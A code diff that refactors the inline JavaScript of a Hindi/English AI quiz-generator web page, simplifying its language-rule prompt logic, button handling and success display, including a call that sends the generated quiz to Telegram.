-          languageRule = "STRICT LANGUAGE RULE: Output every question, option, and explanation ONLY in pure, natural Hindi (Devanagari script).";
-          langDisplayName = "हिंदी (Hindi Only)";
-        } else if (langOption === 'en') {
-          languageRule = "STRICT LANGUAGE RULE: Output every question, option, and explanation ONLY in English.";
-          langDisplayName = "English Only";
-        } else if (langOption === 'bilingual') {
-          languageRule = "STRICT BILINGUAL RULE: Format each question and all options in BOTH Hindi and English.";
-          langDisplayName = "Bilingual (हिंदी + English)";
-        } else {
-          languageRule = "LANGUAGE RULE: Keep the original language used in the source material.";
-          langDisplayName = "Original";
-        }
+        let languageRule = (langOption === 'hi') 
+          ? "STRICT LANGUAGE RULE: Output every question, option, and explanation ONLY in pure, natural Hindi (Devanagari script)." 
+          : (langOption === 'en') ? "STRICT LANGUAGE RULE: Output every question, option, and explanation ONLY in English." : "BILINGUAL: Provide both Hindi and English.";
 
         let quantityInstruction = (qCount === 'all') 
           ? `Extract and generate ALL multiple choice questions (MCQs) available across the material.`
@@ -2482,7 +2170,7 @@ ${quantityInstruction}
 ${languageRule}
 ${rangeRule}
 ${extraTextPrompt}
-Strictly return ONLY a valid JSON array of objects. Do not write commentary.
+Strictly return ONLY a valid JSON array of objects.
 Format:
 [
   {
@@ -2501,11 +2189,8 @@ Note: answer must be an integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
         }
       }
 
-      // 🛠️ SAFE BUTTON HANDLING (PREVENTS FREEZING)
       const actionBtns = document.querySelectorAll('.btn-action');
       actionBtns.forEach(b => b.disabled = true);
-      const singleGenBtn = document.getElementById('generateBtn');
-      if (singleGenBtn) singleGenBtn.style.display = 'none';
 
       document.getElementById('loaderBox').style.display = 'block';
       startRealStopwatch();
@@ -2517,7 +2202,7 @@ Note: answer must be an integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
         ]
       }];
 
-      let success = false, usedModelName = '', lastErr = '';
+      let success = false, lastErr = '';
       const isLargeSet = (qCount === 'all' || parseInt(qCount, 10) >= 50);
       const timeoutMs = isLargeSet ? 180000 : 70000;
 
@@ -2554,11 +2239,9 @@ Note: answer must be an integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
 
           if (parsed && Array.isArray(parsed) && parsed.length > 0) {
             quizData = parsed;
-            originalQuizData = [...parsed];
             success = true;
-            usedModelName = currentModel;
             saveQuizToHistory(quizData);
-            await sendHtmlFileToTelegram(quizData, currentModel, langOption);
+            await sendHtmlFileToTelegram(quizData);
             break;
           }
         } catch (err) {
@@ -2568,16 +2251,10 @@ Note: answer must be an integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
 
       stopRealStopwatch();
       document.getElementById('loaderBox').style.display = 'none';
-
       actionBtns.forEach(b => b.disabled = false);
-      if (singleGenBtn) singleGenBtn.style.display = 'flex';
 
       if (success) {
-        document.getElementById('setupView').style.display = 'none';
-        document.getElementById('modeSwitcher').style.display = 'none';
-        document.getElementById('actionHubView').style.display = 'block';
-        document.getElementById('actionHubTopicTitle').innerText = `🎉 "${activeQuizTopic}" तैयार हो गया!`;
-        document.getElementById('actionHubMeta').innerText = `कुल ${quizData.length} सवाल तैयार हैं • जनरेशन टाइम: ${stopwatchSeconds}s`;
+        showActionHub();
       } else {
         alert(`सवाल जनरेट नहीं हो सके।\nएरर: ${lastErr || 'समय समाप्त हुआ'}\n\nकृपया 15/20 सवाल चुनकर दुबारा प्रयास करें।`);
       }
@@ -2585,4 +2262,3 @@ Note: answer must be an integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
   </script>
 </body>
 </html>
-
